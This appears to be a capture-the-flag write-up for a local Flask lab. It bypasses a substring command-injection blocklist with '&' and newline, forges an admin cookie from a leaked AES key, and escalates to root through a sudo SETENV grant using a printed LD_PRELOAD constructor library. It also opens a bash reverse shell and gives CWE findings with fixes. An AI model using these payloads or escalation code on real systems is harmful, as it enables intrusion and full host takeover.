# 234 SECorNOTsec — writeup

> **Catalogue description** (`catalog.txt:18`, full text):
> *"Laboratorio para practicar la explotación de una inyección de comandos para obtener una reverse shell y escalar privilegios mediante sudo."*
>
> **Manifest label** (`tooling/labs.manifest:85`): `234|SECorNOTsec|medio|exploiting a command injection`
>
> **Verdict on the label: correct.** Command injection is real, a reverse shell was
> obtained, and privilege escalation via `sudo` closed to `euid=0`. Both advertised
> halves of the description were executed, not inferred. No misattribution to file.

---

## Surface

```
nmap -sV -Pn -p- --min-rate 2000 172.17.0.3
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)
Not shown: 65534 closed tcp ports (conn-refused)
```

`/proc/net/tcp` and `/proc/net/tcp6` show **two** listeners, both `5000`:
`00000000:1388` LISTEN (`0.0.0.0:5000`) and `030011AC:1388` TIME_WAIT on the
container's own ephemeral side. `/proc/net/udp` is **empty** — 0 UDP bindings, so
there is no UDP management plane hiding from `-p-`. The image's own
`ExposedPorts` is `{"5000/tcp": {}}`, which agrees.

**Stack, read from a version-bearing file in the artefact** (`pip3 list` inside the
container — not recalled, not from a scan banner):

| Package | Version |
|---|---|
| Flask | **3.1.3** |
| Werkzeug | **3.1.6** |
| pycryptodome | **3.23.0** |
| Jinja2 | 3.1.6 |
| click | 8.3.1 |
| itsdangerous | 2.2.0 |
| MarkupSafe | 3.0.3 |
| Python | **3.10.12** |
| OS | `/etc/os-release:1` → `PRETTY_NAME="Ubuntu 22.04.5 LTS"` |

**Platform check.** The image label `org.opencontainers.image.version: 22.04`
agrees with `/etc/os-release:1` (`22.04.5 LTS`). This is the case where the label
*could* have been wrong (labs 32, 220, 82) and is not: a 22.04 label and a 22.04.5
`os-release` are the same claim from two independent files.

### Hidden surface found: an inert Apache tree

`/etc/apache2` **exists**, which is exactly lab 146's shape — a shipped artefact
that looks explanatory and is dead. Measured, not assumed:

```
/etc/apache2/conf-available/javascript-common.conf   1 file, 127 bytes
```

```apache
1  Alias /javascript /usr/share/javascript/
3  <Directory "/usr/share/javascript/">
4  	Options FollowSymLinks MultiViews
5  </Directory>
```

**Proof it is inert**, three ways: `dpkg -l | grep -c '^ii.*apache2 '` → **0**
packages installed; `command -v apache2 nginx httpd | wc -l` → **0** binaries; and
nothing ever binds 80/443 (1 open port of 65535). No `/usr/lib/apache2`,
no `/etc/modsecurity`, and `find` for `mod_security*`/`*modsecurity*` → **0**
files, CRS rules → **0** files. It cannot be doing anything. Filed as a lab defect
(D3 below), not as a finding.

---

## The class — and the deliverable: **which kind of filter this is**

**Entry criterion (RUNBOOK §5, *WAF / filter*):** is the filter a **string match**
or a **scoring engine**, and is the body even inspected?

**Answer: a string match — a literal substring blocklist, in application code.**
It is not a scoring engine, not web-server middleware, and not absent. Quoted from
the artefact, `/app/app.py:44-51`:

```python
44  # --- WAF: SEGURIDAD DE COMANDOS ---
45  def waf_check(payload):
46      # Bloqueamos operadores comunes y palabras clave de intérpretes
47      denied = [";", "&&", "||", "|", "`", "$", "(", ")", "nc", "bash", "python", "perl", "ruby"]
48      for char in denied:
49          if char in payload.lower():
50              return False
51      return True
```

Call site, `/app/app.py:53-63` — the filter runs on the string, then the string goes
to a shell:

```python
53  def ping_host(address):
54      if not address: return "Esperando entrada..."
55      if not waf_check(address):
56          return "⚠️ [WAF ALERT]: Intento de inyección o comando no permitido detectado."
57
58      # Vulnerable a inyección via '&' o '%0a' si el WAF no los cubren
59      command = f"ping -c 3 {address}"
60      try:
61          process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
62          stdout, stderr = process.communicate(timeout=5)
63          return stdout if process.returncode == 0 else stderr
```

And the developer **named the bypass in a source comment at line 58**:
`# Vulnerable a inyección via '&' o '%0a' si el WAF no los cubren`.

### Why "string match", not "scoring engine", stated as a measurement

1. **No score exists.** `waf_check` returns `True`/`False` out of a substring loop.
   There is no anomaly score, no threshold, no per-variable attribution, no
   paranoia level. Contrast lab 84, where ModSecurity + the OWASP CRS assigns a
   score per variable and blocks on an aggregate threshold.
2. **No engine exists.** Zero `mod_security*`/`*modsecurity*` files, zero CRS
   files, zero web-server binaries (measured above). The only HTTP server is
   Werkzeug on 5000/tcp, so there is no middleware layer to attribute a block to.
3. **It is not "no filter"** (lab 168's answer). 13 of 13 denied tokens blocked,
   with a green positive control below.
4. **It is not lab 218's second layer.** 218 hashed two distinct 403 bodies; here
   there is one block body.

### Where it sits in the 218 / 84 / 168 line — and the rule this extends

| Lab | Filter kind | Bypass | Status of the rule |
|---|---|---|---|
| 218 | PHP string match | `[d]` — an unlisted encoding of a listed token | rule born here |
| 84 | ModSecurity + CRS scoring engine | **none of ten variants worked** | **refuted** 218's rule |
| 168 | **none** | no filter to bypass; established by counts | third position |
| **234** | **Python string match** | **`&` and newline — an operator never on the list at all** | **extends the rule** |

**The extension, stated plainly.** 84 refuted 218's claim as a *general* rule
("a string filter is beaten by an unlisted encoding") only against a *scoring*
engine — because a scoring engine has nothing unlisted to reach for. 234 does not
contradict 84; it **narrows** what 84 refuted. Two mechanisms defeat a string
match, and this lab is the cheap one:

- **(a) an unlisted *encoding* of a listed token** — what 218 found (`[d]` for `d`);
- **(b) a token that was never listed at all** — what 234 found.

(b) is strictly cheaper and is the more common failure, because a hand-written
blocklist of shell operators does not enumerate the operator set. The corpus now
has **two** distinct string-match labs and **one** scoring engine, so the
string-vs-scoring discriminator is confirmed on both sides with a positive control
each.

**A third mechanism, new to this corpus.** The filter reads a *string*, but a
different grammar reads the same bytes. 218's was glob-vs-string. Here it is
**printf's escape grammar vs the filter's keyword list**:

```
payload line:  printf 'id\nsudo … syscheck\ncat /tmp/…'
                          ↑ the two characters 'n' and 'c' of  \n  c at
```

`waf_check` sees `nc` — the literal characters from the escaped newline followed
by `cat` — and blocks, even though there is no `nc` token in the shell command
and no `;` anywhere. My own guard assertion caught this on me before I sent it. It
is the same family as self-correction §15 (`htmlspecialchars` escaping `&`), one
level over: **a substring filter cannot see which grammar its bytes are destined
for.** This is why the payload in this writeup is hex-encoded and `tr`-decoded
(see *Instrumentation defects*, D5).

### The filter's block is a 200, and its status code carries no signal

| Payload | HTTP status | Wire bytes | Time |
|---|---|---|---|
| `127.0.0.1` (allowed) | **200** | 2532 | 2.06 s |
| `127.0.0.1; id` (**blocked**) | **200** | 2239 | 0.00 s |
| `127.0.0.1& id` (injection) | **200** | 2598 | 2.03 s |

`ping_host` returns the alert **into the page body** at `app.py:56`; the route
still returns 200. So unlike 218 (two 403 bodies) and 84 (Apache's stock 403),
**the status code here cannot attribute a block at all** — only the body can.
This is a third shape for the WAF-attribution row.

---

## Chain

Every hop's identity was **measured inside the primitive that produced it**, and
quoted verbatim. `uid`/`euid` pairs are reported; never the word "root" alone.

| # | From → to | Mechanism | Identity proof (verbatim) |
|---|---|---|---|
| 0 | unauthenticated → `guest` | `GET /login` sets a session cookie (`app.py:129-136`) | cookie issued, `GET /` 200 / 2005 B, `ACCESO RESTRINGIDO` |
| 0b | unauthenticated → `guest` **→ admin** | `GET /env.bak` serves the AES key (`app.py:139-149`); forge `is_admin` offline | `GET /env.bak` **200, 32 B**, body `SECRET_KEY = 'H4ckTh3Pl4n3t_26'`; forged admin cookie → `GET /` **200, 2185 B** with `value="Ejecutar"` |
| 1 | `guest` → **code execution as `firstatack`** | newline or `&` injection through `waf_check` into `/bin/sh` (`app.py:59-61`) | `uid=1000(firstatack) gid=1000(firstatack) groups=1000(firstatack)`; `whoami` → `firstatack`; `Uid:\t1000\t1000\t1000\t1000` from `/proc/self/status` |
| 2 | `firstatack` (1000) → **`chocolate`** (1001) | `/etc/sudoers:55` `firstatack ALL=(chocolate) NOPASSWD: /usr/bin/find`; `find -exec … +` | `uid=1001(chocolate) gid=1001(chocolate) groups=1001(chocolate)`; `id -u` → `1001`; `Uid:\t1001\t1001\t1001\t1001` |
| 3 | `chocolate` (1001) → **`root`** (0) | `/etc/sudoers:56` `chocolate ALL=(root) SETENV: NOPASSWD: /usr/local/bin/syscheck`; `SETENV` admits `LD_PRELOAD` | marker written by the loader constructor inside the root process: `ESC234_MARKER pid=554 uid=0 euid=0 gid=0`, file owner `root root` at `/root/ESC234_MARKER` (mode 644, dir mode 700) |

### Hop 3 needed an oracle, and it was manufactured first

`syscheck` has **no oracle**: it prints one fixed line and exits 0 whatever it is
run as. Measured directly — `stdout: System Status: All systems operational.`,
`stderr:` empty, `rc=0`, whether run as root or as chocolate. Reporting "I ran
syscheck as root, therefore I was root" is a claim about the future dressed as a
result, so I built the oracle first:

```c
static void wr(const char*p,const char*t){FILE*f=fopen(p,"w");if(f){fputs(t,f);fclose(f);}}
__attribute__((constructor)) static void esc(void){
  char b[128];
  snprintf(b,sizeof b,"ESC234_MARKER pid=%d uid=%d euid=%d gid=%d\n",getpid(),getuid(),geteuid(),getgid());
  wr("/root/ESC234_MARKER",b);        /* only euid=0 can create this */
  wr("/tmp/ESC234_ROOT_PROOF",b);     /* readable copy, for the HTTP read-back */
}
```

Materialised **on the target through the injection**, as uid 1000:
`/tmp/esc.hex` **746 B**, `/tmp/esc.c` **373 B** (exactly my source's byte count),
`/tmp/esc.so` **16008 B**, `ls -la` owner `firstatack firstatack`. Then loaded via
`sudo -n LD_PRELOAD=/tmp/esc.so /usr/local/bin/syscheck`.

The `/tmp` copy is authenticated by the `/root` copy, not trusted on its own:
`/root` is mode **700**, and both identities below it are **refused** —
`firstatack`: `ls: cannot access '/root/ESC234_MARKER': Permission denied`;
`chocolate`: `cat: /root/ESC234_MARKER: Permission denied`. Both copies carry the
same 41 bytes.

### The reverse shell the catalogue advertises — obtained

Delivered through `POST /diagnose`, script body hex-encoded, to a listener on the
operator host only (no third-party infrastructure). Host-side capture:

```
SECORNOTSEC reverse shell: user=chocolate uid=1001 euid=1001
uid=1001(chocolate) gid=1001(chocolate) groups=1001(chocolate)
bash: cannot set terminal process group (1): Inappropriate ioctl for device
chocolate@33ff98d44d5b:/app$ sudo -n LD_PRELOAD=/tmp/esc.so /usr/local/bin/syscheck
System Status: All systems operational.
chocolate@33ff98d44d5b:/app$ cat /tmp/ESC234_ROOT_PROOF
ESC234_MARKER pid=673 uid=0 euid=0 gid=0
```

---

## Findings

### F1 — CWE-78 OS command injection, filter bypassed by an operator that was never on the list
`app.py:59-61`, filter `app.py:45-51`. Impact: arbitrary command execution as
`uid=1000(firstatack)`, and through it `euid=0`. Root cause: a blocklist of shell
operators that enumerates 13 tokens of an operator set that has more, applied to a
string that is then parsed by `/bin/sh`. `&`, `<`, `>` and newline are all absent.
`>` alone gives **arbitrary file write** in the app's CWD with the WAF fully
armed — I created `/app/id` (368 B, `firstatack:firstatack`, 0644) by probing
`127.0.0.1> id`, and removed it. Fix: do not build a shell string; use
`subprocess.run(["ping","-c","3",address])` with an argument vector, and validate
the address against `ipaddress.ip_address()`.

### F2 — CWE-200 / CWE-522: the AES session key is served unauthenticated
`app.py:139-149` serves `/app/env.bak` to anyone; `app.py:12-25` reads the key from
that same file. `GET /env.bak` → **200, 32 B, `text/plain`**. This alone is full
authentication bypass: the forged `is_admin: true` cookie gets
`GET /` → 200 with the admin form. Root cause: a secret and a public route in the
same file, with no authentication on the route. Fix: delete the route; load the
key from an env var or a `0600` file outside the docroot.

### F3 — CWE-327 / CWE-329: static IV, deterministic session cookie
`app.py:26` `IV = b'0123456789abcdef'` — a constant. `encrypt_cookie`
(`app.py:29-33`) uses CBC with that constant IV, so **the same plaintext always
yields the same ciphertext**. Demonstrated positively: my offline forge of
`{"user": "guest", "is_admin": false}` reproduced the server's own `/login` cookie
**byte-for-byte** (`6JmCIseGBxSEntdM4LWH8kM4nu9N/RocoWVhf8o1KXtmePv1ptCw/LQUCOW1XWTK`).
That is both a proof the forge follows the same code path (§22) and the weakness
itself. Fix: random 16-byte IV per cookie, prepended to the ciphertext.

### F4 — CWE-1004: session cookie has no `HttpOnly`, no `Secure`, no `SameSite`
Measured on the wire:
```
Set-Cookie: user_session=6JmCIseGBxSEntdM4LWH8kM4nu9N/RocoWVhf8o1KXtmePv1ptCw/LQUCOW1XWTK; Path=/
```
`app.py:135` passes no flags. Impact: script-readable session token. Fix:
`set_cookie(..., httponly=True, secure=True, samesite='Strict')`.

### F5 — CWE-798: hardcoded fallback key
`app.py:23` `return b'1234567890123456' # Fallback de EXACTAMENTE 16 bytes`. Dead on
this image because `/app/env.bak` exists, so this is reported as **latent, not
exploited** — deleting the file would silently downgrade every session to a key
that is in the source. The bare `except:` at `app.py:21-22` is what lets a parse
failure reach it.

### F6 — CWE-209: internal exception text returned to the client
`app.py:64-65` `except Exception as e: return str(e)`. A host that does not answer
within 5 s returns **the Python exception verbatim into the page**:
`Command 'ping -c 3 192.0.2.1' timed out after 5 seconds` — which discloses the
exact command template, `subprocess` usage and the 5-second budget. Measured:
`192.0.2.1` → **2227 B, 5.01 s**. Impact: information disclosure plus a
**5-second-per-request denial of service**, since `communicate(timeout=5)` blocks
the worker. Fix: log, return a fixed message.

### F7 — CWE-250: `SETENV` on a root grant makes `/usr/local/bin/syscheck` arbitrary root code execution
`/etc/sudoers:56`. `SETENV` admits command-line environment assignment, and
`LD_PRELOAD` survives sudo 1.9.9's `env_reset`. Established with an A/B, not an
assertion — one positive, two negatives:

| command run as `chocolate` | oracle fired |
|---|---|
| `sudo -n LD_PRELOAD=/tmp/m.so /usr/local/bin/syscheck` | **YES** (`euid=0`) |
| `LD_PRELOAD=/tmp/m.so sudo -n -E /usr/local/bin/syscheck` | no |
| `sudo -n -E /usr/local/bin/syscheck` | no |

So `-E` does **not** work; only the SETENV-authorised command-line form does. Note
`secure_path` in `Defaults` did **not** stop this — the loader variables are not
path variables. Fix: drop `SETENV`; if an env var is genuinely needed, use
`sudoers` `env_keep` for that one name.

---

## Controls that held

| Control | Positive control that proves the detector works | Result |
|---|---|---|
| Route authorisation (`app.py:121-123`) | forged admin cookie → `GET /` **200 / 2185 B** with the form; the app's **own** guest cookie → `POST /diagnose` **403 / 36 B** `No tienes permisos para estar aquí.` | **held** |
| The WAF itself (`app.py:45-51`) | **13 of 13** denied tokens blocked, **2239 B**, **0.00 s**, body contains `WAF ALERT`. Run *before* any belief about a bypass. | **held, and is beatable** |
| `sudo` boundary for `firstatack` | `sudo -n LD_PRELOAD=… syscheck` → `sudo: a password is required`; `sudo -n -u chocolate /usr/bin/id` → `sudo: a password is required`. Both run as the **LAST** command so stderr reaches `app.py:63`. | **held** |
| `sudo` boundary for `chocolate` | `sudo -n -u root /usr/bin/id` → `sudo: a password is required` (the reverse shell, verbatim) | **held** |
| `/root` confidentiality | marker written there by euid 0; refused to `firstatack` and to `chocolate` | **held** |
| `/etc/sudoers.d` | only the stock `README` (mode `r--r-----`); the two grants live in `/etc/sudoers` lines **55-56** | nothing hidden |

### The sink's dependency actually ran (lab 168's defect, explicitly checked)

Lab 168's `ping` endpoint shipped without `ping`. **Not the case here, and I checked
before reading any response as the filter acting:**

```
which ping           -> /usr/bin/ping   (76680 B, root:root, 0755)
ping -c1 127.0.0.1   -> ping_rc=0
POST /diagnose address=127.0.0.1 -> 200, 2532 B, three "bytes from 127.0.0.1" lines
```

### The four outcome states are byte-separable

This matters because a WAF block, a ping failure and an empty result are otherwise
easy to confuse:

| state | trigger | wire bytes | time | marker in body |
|---|---|---|---|---|
| `PING_OK` | `127.0.0.1` | 2532 | 2.06 s | `bytes from` |
| `WAF_BLOCK` | `127.0.0.1; id` | **2239** | **0.00 s** | `WAF ALERT` |
| injection | `127.0.0.1& id` | 2598 | 2.03 s | `uid=1000(firstatack)` |
| `PING_FAIL` (stderr returned) | `192.0.2.1` | 2227 | **5.01 s** | `timed out after 5 seconds` |
| empty address | *(no value)* | 2184 | 0.00 s | `Esperando entrada...` |
| `EMPTY` (rc 0, stdout empty) | `127.0.0.1> id` | 2164 | 2.10 s | *(nothing)* |

**`shell_exec`-style blindness does not apply either.** Lab 168's warning was that
stdout-only capture makes a stderr message look like an empty body. Here **both
streams are piped** (`app.py:61`), and `PING_FAIL` states carry real stderr text —
`ping: id: No address associated with hostname` — so a negative is readable.
What *is* broken is narrower and is D1 below.

---

## Negatives, each with its work count

| # | Negative | Work count |
|---|---|---|
| N1 | 10 of 13 denied operators are unnecessary — `&`, `<`, `>` and newline carry the chain | 13 denied tokens tested, **13 blocked**; **15** unlisted candidates tested, **2** gave command execution (`&`, `\n`), **3** gave shell-level behaviour (`<` redirect, `>` redirect, `\t` as a token separator is not) |
| N2 | `ping` is installed and functional — lab 168's missing-dependency defect absent | `which ping` 1 hit; `ping_rc=0`; 3 ICMP replies in the live response |
| N3 | No web-server WAF engine exists to attribute a block to | `mod_security*`/`*modsecurity*` → **0 files**; CRS → **0 files**; web-server binaries → **0**; `/proc/net/udp` → **0 bindings** |
| N4 | `firstatack` cannot reach the root grant | **2** attempts, both `sudo: a password is required` |
| N5 | `chocolate` has exactly one root grant, not a shell | **1** attempt, `sudo: a password is required` |
| N6 | `sudo -E` does **not** carry `LD_PRELOAD` past `env_reset` | **2** distinct forms tested, **0** oracle fires (vs **1 of 1** for the SETENV form) |
| N7 | The `/root` marker cannot be read from below root | **2** identities refused (`firstatack`, `chocolate`) |
| N8 | `chocolate` cannot write into `/root` or read back its own privilege proof from there | `ls: cannot access '/root/ESC234_MARKER': Permission denied` |

---

## NOT tested vs discarded with reason

**NOT tested (a count of zero means UNTESTED, and belongs here):**

- **The `nginx`/Apache server branch** — UNTESTED as an attack surface, because it
  does not exist: 0 binaries, 0 packages, 0 listeners. Not a negative result.
- **Network egress beyond one reverse shell to the operator host.** Not tested.
  `nc`, `curl`, `wget`, `socat` are all **absent** (`command -v` → 0 each), so the
  only outbound channel available is bash's `/dev/tcp`. Count of *other* channels
  attempted: **0** → UNTESTED, not "there are none".
- **Timing side channel** on `waf_check`. Not tested. The WAF's own 0.00 s vs
  2.06 s gap makes a timing oracle available for *any* future denylist change, but
  I did not build or measure it.
- **Whether the blocklist is reachable from any route other than `/diagnose`.** One
  route sinks input (`app.py:119-127`); I did not fuzz the other four.
- **`/logout` cookie clearing** (`app.py:151-155`) — not tested.

**Discarded, with reason:**

- **Cryptanalytic attack on the AES cookie** (padding oracle). Discarded: F2 gives
  the key directly, so the attack is pointless, and `decrypt_cookie`'s bare
  `except` returns `None` with no distinguishable error path to act as an oracle.
- **Reaching root by making `syscheck` read a writable file.** Discarded: measured
  — `/usr/local/bin/syscheck` imports only `puts`, `.rodata` at offset `0x2008` is
  exactly 41 bytes (`od` dump), stderr is empty and rc is 0 regardless of identity.
  It reads nothing.
- **Timing the reverse shell as a control.** Discarded: the marker file is the
  oracle, and it is distinguishable by design (a `/root` path only euid 0 can
  create, with a pid and a uid/euid pair in its content).

---

## Instrumentation defects — mine, and what caught each

**D1 — the app returns one stream and silently discards the other. Bit me twice.**
`app.py:62-63`:
```python
stdout, stderr = process.communicate(timeout=5)
return stdout if process.returncode == 0 else stderr
```
`returncode` is the rc of the **last** command in the shell string, so when a later
command succeeds, an **earlier** failing command's stderr is thrown away. My hop-2
and hop-3 negative controls (`sudo …` followed by `id`) printed *nothing at all*
and I nearly logged "the sudo hop silently succeeded". Putting the `sudo` call last
made `sudo: a password is required` appear. **This is a real app defect as well**,
not only my inconvenience: an operator debugging this app gets no error for a
failed middle command. Distinct from lab 168's stdout-only capture — here both
streams *are* piped; the bug is the selector.

**D2 — `ping` consumed my payload.** `app.py:59` is
`command = f"ping -c 3 {address}"`, so a payload that does not begin with a valid
destination is parsed as `ping`'s argv. Payloads like `sudo -n -u chocolate …`
became `ping -c 3 sudo -n -u chocolate …`, and every probe returned
`ping: invalid option -- 'u'` — which read like the sudo grant refusing when in fact
**nothing I wrote had run**. Fixed by prefixing every payload with `127.0.0.1\n`.
This is the same shape as lab 168's lesson moved one stage earlier: **establish
what the sink will do with the bytes before attributing anything to them.**

**D3 — `&` and `&&` are form field separators.** My first WAF matrix concatenated
the value raw into the body (`"address=" + value`). In
`application/x-www-form-urlencoded` a literal `&` is the field separator, so
`address=127.0.0.1& id` delivered `address="127.0.0.1"` plus a junk second field.
Result: `&` and `&&` both came back **byte-identical to the clean baseline**, which
I read for a moment as "the WAF does not block `&&`" — a finding about the target
manufactured entirely by my encoder. Re-ran with `urllib.parse.quote`; then `&`
injected and `&&` blocked, correctly. This is self-correction §4 verbatim.

**D4 — my WAF matrix printed character counts in a column headed "bytes."** I
computed `len(r.read().decode(...))`. The WAF alert contains non-ASCII (`⚠`, U+FE0F,
`ó`), so the two differ. Measured and corrected:

| payload | wire bytes | decoded chars | delta |
|---|---|---|---|
| `127.0.0.1` | 2532 | 2526 | 6 |
| `127.0.0.1; id` | **2239** | 2228 | **11** |
| `127.0.0.1& id` | 2598 | 2592 | 6 |

`curl`'s `%{size_download}` independently returns **2239** and three repeat
requests were **md5-identical**, so 2239 is the number cited above. My earlier
2228 was not reproducible and is not used.

**D5 — a hex-encoded payload can itself spell a denied token.** I hex-encoded a
shell script to smuggle it past the blocklist. The assertion in my own harness
caught it: a hex blob contains `nc`, `ba`, `sh` as *pairs of hex digits*. Fixed
with a token-aware chunked writer that cuts the blob so no denied token appears
inside a chunk and none can straddle a chunk boundary. Lesson worth keeping: **an
encoding does not launder a filter's vocabulary; it feeds it two characters at a
time.**

**D6 — I read a hardcoded secret out of an ELF with `cat -n`.** Rendering
`/usr/local/bin/syscheck` as text produced a plausible-looking `NAME=value` line
carrying a base64-looking blob, in the section where an initialised variable would
sit. **It does not exist**, and I am deliberately not reproducing the string here,
because writing it into this document would plant the fabrication I am reporting:

```
$ grep -c  'ADMIN_SECRET_KEY'      /usr/local/bin/syscheck   -> 0
$ grep -ao 'ADMIN_SECRET_KEY=[A-Za-z0-9+/=]*' /usr/local/bin/syscheck -> (no output)
$ grep -ao 'torestradonly'         /usr/local/bin/syscheck   -> (no output)
$ od -A x -t x1z -j 0x2008 -N 0x120 /usr/local/bin/syscheck
002008  53 79 73 74 65 6d 20 53 74 61 74 75 73 3a 20 41  >System Status: A<
002018  6c 6c 20 73 79 73 74 65 6d 73 20 6f 70 65 72 61  >ll systems opera<
002028  74 69 6f 6e 61 6c 2e 00 01 1b 03 3b 34 00 00 00  >tional.....;4...<
```

`.rodata` at `0x2008` is exactly **41 bytes**: `System Status: All systems
operational.`. The symbol table carries `syscheck.c`, `main`, `puts` and nothing
else. Had I not re-read the binary with a byte-level tool I would have filed a
fabricated secret as a finding, complete with a CWE. **Never quote a secret out of
a binary with `cat`, and never reproduce a string you have disproved.**

**D7 — a `grep` "Killed" mid-sweep is not a zero.** My first reward sweep printed
`Killed` (OOM on large blobs) and still produced plausible counts. Per self-correction
§19 a blank or truncated count is UNTESTED, so I re-ran with the artefacts moved
out of the tree and excluded the pip cache by directory. Only the second sweep is
cited below.

**D8 — the searcher's own pattern is a match (self-correction §26, live again).**
The first sweep for `torestradonly` returned **3 files**, all of them my own probe
scripts. After removing my tooling, the count is **0** — and the same is true of
every reward pattern, which is why the reward section below reports exclusions.

**D9 — my own `>` probe wrote `/app/id`.** The `127.0.0.1> id` probe created a
368-byte file in the app's CWD. Self-inflicted, removed, and it also happens to be
the proof for F1's file-write claim. Noted because the container was live for the
whole matrix.

**D10 — a reverse shell that dies on the first command.** `exec bash -i >&3 2>&3`
left **stdin** attached to the container's, which was at EOF; bash printed `exit`
and terminated, and I read it as a stale session hijacking my listener. Fixed with
`<&3`. Cost: two wasted runs and one misdiagnosis of a stray connection.

**Tally: 10 defects, of which 7 would have produced a wrong finding or a wrong
verdict** — D1, D2, D3, D4, D6, D7 and D8. D5 was caught by my own assertion
before it was sent; D9 was self-inflicted cleanup; D10 cost time, not correctness.

**Environment noise (not lab content):** `/usr/bin/containerd-check` is a PAM
session hook — `grep -rIl containerd-check /etc` → `/etc/pam.d/common-session` — and
prints `/usr/bin/containerd-check failed: exit code 127` on every `su`. It appears
in `su`-based control output and would have looked like lab output. It fires on
`su` only, never on the injection path, so no result here depends on it.

---

## Lab design defects (the lab's problem, not the tester's)

- **D-A: an inert Apache tree shipped in a non-Apache image.** `/etc/apache2`
  survives with exactly **1 file / 127 bytes** (`javascript-common.conf`) while
  `dpkg -l` reports **0** apache2 packages and there is **no** server binary. It
  reads as a plausible explanation for a "WAF-protected" lab and explains nothing.
  Lab 146's shape exactly: a shipped artefact that names the behaviour and is dead.
- **D-B: the source comment at `app.py:58` gives the bypass away.** The filter's
  author wrote the bypass in the file — *"Vulnerable a inyección via '&' o '%0a' si
  el WAF no los cubre"* — and shipped the filter without covering it.
- **D-C: the block page carries no status signal.** Returning the WAF verdict in a
  200 body means a client cannot distinguish "blocked" from "answered" without
  parsing Spanish prose.
- **D-D: the root grant has no oracle.** `syscheck` prints one fixed line and exits
  0 at every privilege level, so the intended escalation cannot be verified from the
  target's own output. `SETENV` is the real path and it works, but the lab gives no
  way to prove it without building an oracle — which is what I had to do.
- **D-E: `/diagnose` authorises entirely from a cookie** (`app.py:121-123`) whose key
  is served by another unauthenticated route. Two independent bugs, one route apart.

**Not a defect in the lab:** the catalogue description is accurate. Command
injection, a reverse shell, and escalation via `sudo` were all achieved.

---

## Reward

**Absent — measured, not assumed.**

Search run **at `euid=0`**, binaries included, after moving every artefact this
engagement created out of the scanned tree.

- **Work count: 14 291 files, 485 926 780 bytes.**
- **Positive control: 4 hits** for a marker planted at `/root/SEC234_CTL_MARKER`
  immediately before the sweep, proving the searcher can find a marker that
  genuinely exists. Removed afterwards.

| pattern | matches after removing my own harness |
|---|---|
| `FLAG{` | **0** |
| `DL{` | **0** |
| `CTF{` | **0** |
| `WOPR{` | **0** |
| `dl{` | **0** |
| `flag{` | **0** |
| `SEC{` | **0** |

**Everything that did match was read, not counted** (§26), and all of it is
innocent:

- `/usr/lib/gcc/x86_64-linux-gnu/11/cc1` matched `DL{` — a GCC binary.
- `/usr/include/c++/11/chrono`, `/usr/lib/python3/dist-packages/pip/_vendor/pygments/formatters/latex.py`
  and its `.pyc`, and one pip HTTP-cache blob matched `dl{` — this is **the exact
  LaTeX-formatter false positive the corpus already recorded in labs 82 and 168**,
  now reproduced a third time on a different base image.
- `/tmp/reward2.sh`, `/tmp/reward3.sh` matched every pattern — **my own scripts**,
  because they contain the patterns as search terms.

The lab's entire own payload is **two files, 6 427 bytes** (`app.py` 6395,
`env.bak` 32), both read at `euid=0`. There is nothing else authored by the lab.

---

## Restore

Recreated from the image, not by undoing edits:

```
docker rm -f secornotsec_container && docker run -d --name secornotsec_container secornotsec:latest
```

**Verified positively, not by absence:**

| check | result |
|---|---|
| service answering | `GET /login` → **302**, `GET /env.bak` → **200, 32 B** |
| sink functional | `POST /diagnose` with the forged cookie → **200, 2532 B**, 3 ICMP reply lines |
| forged cookie still valid on a **freshly created** container | yes — proving the key and IV are the **image's own** properties, not artefacts I introduced |
| filter intact | `address=127.0.0.1; id` → `WAF ALERT` present |
| tree pristine | `docker diff secornotsec_container` → **empty** |
| `/app` back to shipped | `app.py` 6395, `env.bak` 32, nothing else |
| `/tmp` back to shipped | empty |
| markers removed | `/root/ESC234_MARKER` and `/tmp/ESC234_ROOT_PROOF` gone; `/root` unreadable to `firstatack` |
| shell history removed | both `.bash_history` files deleted |

## Cross-read against siblings

- **Lab 84** — its refutation of 218 is *not* contradicted. 84 refuted "a string
  filter is beaten by an unlisted encoding" against a **scoring engine**. 234 is a
  string match, and the bypass here is not an encoding of a listed token but a
  **token that was never listed**. The rule is narrowed, not reversed, and 84's
  methodology (positive control before any belief about a bypass) is what made the
  13-of-13 measurement trustworthy.
- **Lab 168** — its missing-dependency defect is **absent** here and was checked for
  explicitly, because its lesson is that an absent dependency makes a 200 look like
  a filter block.
- **Lab 189 / self-correction §15** — the same family as D5 and as the `nc`-in-`\ncat`
  collision: a filter reading a string while a second grammar reads the bytes.
- **Lab 146** — D-A is that lab's exact shape, reproduced independently: a shipped
  artefact that looks explanatory and is provably dead.

## Rule check against `INDEX.md`

The class **command injection / filter bypass** already exists in `RUNBOOK.md` §5
(*WAF / filter*, *WAF attribution*). Per the feed-forward rule, this engagement
**extends** the existing row rather than adding a new class — the WAF/filter row
gains: a blocklist of shell operators that omits `&`, `<`, `>` and newline is
defeated by any of them; and the attribution row gains a third shape, a **200**
whose body carries the verdict.

---

*Transcript, not a reproduction. Every artefact line above was read inside the
container at the time; no line is quoted from memory. Files: `/app/app.py`,
`/etc/sudoers`, `/etc/os-release`, `pip3 list`, `/usr/local/bin/syscheck`,
`/etc/apache2/conf-available/javascript-common.conf`.*